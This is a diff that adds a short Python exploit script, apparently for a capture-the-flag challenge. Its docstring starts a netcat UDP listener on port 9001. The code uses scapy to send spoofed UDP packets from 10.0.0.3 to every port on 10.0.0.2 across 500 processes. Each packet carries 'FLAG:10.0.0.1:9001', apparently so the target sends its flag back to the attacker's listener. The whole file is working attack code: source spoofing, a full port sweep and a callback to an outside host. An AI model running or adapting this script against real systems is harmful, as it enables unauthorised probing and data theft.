@@ -1,0 +1,17 @@
+"""
+nc -lunvp 9001 &
+python exploit.py
+
+"""
+
+from scapy.all import *
+from multiprocessing import Pool
+conf.verb = 0
+
+time.sleep(5)
+
+def udpsend(p):
+    sendp(Ether() / IP(src="10.0.0.3", dst="10.0.0.2") / UDP(sport=31337, dport=p) / b"FLAG:10.0.0.1:9001", verbose=False)
+
+with Pool(processes=500) as pool:
+    pool.map(udpsend, range(1, 65536))
